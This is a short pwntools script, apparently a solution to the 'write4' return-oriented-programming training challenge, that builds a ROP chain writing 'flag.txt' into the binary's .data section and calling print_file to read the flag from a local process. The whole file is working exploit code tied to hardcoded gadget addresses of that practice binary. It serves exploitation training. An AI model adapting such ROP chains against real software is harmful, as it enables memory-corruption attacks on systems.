#usr/bin/python2
from pwn import *
elf = ELF("./write4")

padding = "A"*40
pop_r14_pop_r15 = p64(0x0000000000400690)
section_data = p64(0x000000000601028)
string = "flag.txt"
mov_qword_r14_r15 = p64(0x0000000000400628)
pop_rdi = p64(0x0000000000400693)
call_print_file = p64(0x400510)

payload = padding + pop_r14_pop_r15 + section_data + string + mov_qword_r14_r15
payload += pop_rdi + section_data + call_print_file

print(payload)
io = process(elf.path)
io.recvuntil(">")
io.sendline(payload)
print(io.recvall())

# OR

"""
io = process(elf.path)
io.sendlineafter(">", payload)
io.interactive()
"""